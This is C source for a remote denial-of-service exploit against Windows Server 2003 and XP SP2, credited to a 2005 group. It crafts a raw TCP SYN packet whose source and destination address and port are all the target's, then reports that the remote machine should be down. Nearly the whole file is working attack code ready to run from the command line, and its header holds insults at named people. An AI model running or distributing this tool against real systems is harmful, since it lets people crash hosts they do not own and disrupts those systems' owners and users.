#include <stdio.h> 
#include <ctype.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netinet/in_systm.h> 
#include <netinet/ip.h> 
#include <netinet/tcp.h> 
#include <sysexits.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <sys/types.h> 

/* 
Windows Server 2003 and XP SP2 remote DoS exploit 
Tested under OpenBSD 3.6 at WinXP SP 2 
Vuln by Dejan Levaja <dejan_@_levaja.com>
(c)oded by __blf 2005 RusH Security Team , http://rst.void.ru 
Gr33tz: zZz, Phoenix, MishaSt, Inck-vizitor 
Fuck lamerz: Saint_I, nmalykh, Mr. Clumsy 
All rights reserved. 
*/ 

//checksum function by r0ach 
u_short checksum (u_short *addr, int len) 
{ 
u_short *w = addr; 
int i = len; 
int sum = 0; 
u_short answer; 
while (i > 0) 
{ 
sum += *w++; 
i-=2; 
} 
if (i == 1) sum += *(u_char *)w; 
sum = (sum >> 16) + (sum & 0xffff); 
sum = sum + (sum >> 16); 
return (~sum); 
} 
int main(int argc, char ** argv) 
{ 
struct in_addr src, dst; 
struct sockaddr_in sin; 
struct _pseudoheader { 
struct in_addr source_addr; 
struct in_addr destination_addr; 
u_char zero; 
u_char protocol; 
u_short length; 
} pseudoheader; 
struct ip * iph; 
struct tcphdr * tcph; 
int mysock; 
u_char * packet; 
u_char * pseudopacket; 
int on = 1; 
if( argc != 3) 
{ 
fprintf(stderr, "r57windos.c by __blf\n"); 
fprintf(stderr, "RusH Security Team\n"); 
fprintf(stderr, "Usage: %s <dest ip> <dest port>\n", argv[0]); 
return EX_USAGE; 
} 
if ((packet = (char *)malloc(sizeof(struct ip) + sizeof(struct tcphdr))) == NULL) 
{ 
perror("malloc()\n"); 
return EX_OSERR; 
} 
inet_aton(argv[1], &src); 
inet_aton(argv[1], &dst); 
iph = (struct ip *) packet; 
iph->ip_v = IPVERSION; 
iph->ip_hl = 5; 
iph->ip_tos = 0; 
iph->ip_len = ntohs(sizeof(struct ip) + sizeof(struct tcphdr)); 
iph->ip_off = htons(IP_DF); 
iph->ip_ttl = 255; 
iph->ip_p = IPPROTO_TCP; 
iph->ip_sum = 0; 
iph->ip_src = src; 
iph->ip_dst = dst; 
tcph = (struct tcphdr *)(packet +sizeof(struct ip)); 
tcph->th_sport = htons(atoi(argv[2])); 
tcph->th_dport = htons(atoi(argv[2])); 
tcph->th_seq = ntohl(rand()); 
tcph->th_ack = rand(); 
tcph->th_off = 5; 
tcph->th_flags = TH_SYN; // setting up TCP SYN flag here 
tcph->th_win = htons(512); 
tcph->th_sum = 0; 
tcph->th_urp = 0; 
pseudoheader.source_addr = src; 
pseudoheader.destination_addr = dst; 
pseudoheader.zero = 0; 
pseudoheader.protocol = IPPROTO_TCP; 
pseudoheader.length = htons(sizeof(struct tcphdr)); 
if((pseudopacket = (char *)malloc(sizeof(pseudoheader)+sizeof(struct tcphdr))) == NULL) 
{ 
perror("malloc()\n"); 
return EX_OSERR; 
} 
memcpy(pseudopacket, &pseudoheader, sizeof(pseudoheader)); 
memcpy(pseudopacket + sizeof(pseudoheader), packet + sizeof(struct ip), sizeof(struct tcphdr)); 
tcph->th_sum = checksum((u_short *)pseudopacket, sizeof(pseudoheader) + sizeof(struct tcphdr)); 
mysock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW); 
if(!mysock) 
{ 
perror("socket!\n"); 
return EX_OSERR; 
} 

sin.sin_family = PF_INET; 
sin.sin_addr = dst; 
sin.sin_port = htons(80); 
if(sendto(mysock, packet, sizeof(struct ip) + sizeof(struct tcphdr), 0, 
(struct sockaddr *)&sin, sizeof(sin)) == -1) 
{ 
perror("sendto()\n"); 
shutdown(mysock, 2); 
return EX_OSERR; 
} 
printf("Packet sent. Remote machine should be down.\n"); 
shutdown(mysock, 2); 
return EX_OK; 
} 